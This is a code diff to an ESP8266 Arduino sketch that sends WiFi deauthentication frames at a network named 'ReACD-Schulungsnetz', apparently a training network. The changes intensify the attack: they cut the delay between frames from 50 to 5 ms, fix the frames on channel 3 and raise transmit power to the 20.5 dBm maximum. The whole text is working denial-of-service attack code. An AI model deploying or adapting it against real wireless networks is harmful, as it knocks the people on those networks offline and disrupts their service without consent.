@@ -3,8 +3,8 @@
 
 
 const int wifiChannelMax = 14;
-const char* targetSSID = "schulungsnetz";
-int delayBetweenChannelSwitch = 50; //delay between the deauth frame is sent on another channel in milliseconds
+const char* targetSSID = "ReACD-Schulungsnetz";
+int delayBetweenChannelSwitch = 5; //delay between the deauth frame is sent on another channel in milliseconds
 const int targetNetworkFoundIndicatorPin = 5; //GPIO Pin 5(labeled as D1)
 
 
@@ -72,17 +72,16 @@ void findTargetNetwork()
 {
   bool targetFound = false;
 
-  uint8_t targetBSSID[6]
-  {
+  uint8_t targetBSSID[6];
+  /*{
     0xBA,0x1F,0x3F,0xDA,0x00,0x40
-  };
+  };*/
   //targetFound = true;
 
   while(!targetFound)
   {
     digitalWrite(targetNetworkFoundIndicatorPin, LOW);
     int foundNetworkCount = scanForNetworks();
-    delay(1000);
     for(int i = 0;i<foundNetworkCount;i++)
     {
       Serial.println("Found:"+WiFi.SSID(i)+"|RSSI:"+WiFi.RSSI(i)+"|Channel:"+WiFi.channel(i));
@@ -108,7 +107,9 @@ void attackNetwork(uint8_t bssid[6])
   {
     for(int c = 1; c <= wifiChannelMax; c++)
     {
-      deauthDevice(bssid, c);
+      //deauthDevice(bssid, c);
+      //send deauth frames only on channel used by reacd wifi host(i.e. channel 3)
+      deauthDevice(bssid,3);
       delay(delayBetweenChannelSwitch);
     }
   }
@@ -122,6 +123,8 @@ void setup()
   Serial.begin(9600);
   ESP.eraseConfig();
   WiFi.mode(WIFI_STA);
+  // Maximum configured transmission power: 20.5 dBm
+    WiFi.setOutputPower(20.5);
   WiFi.disconnect();
   WiFi.scanDelete();
 
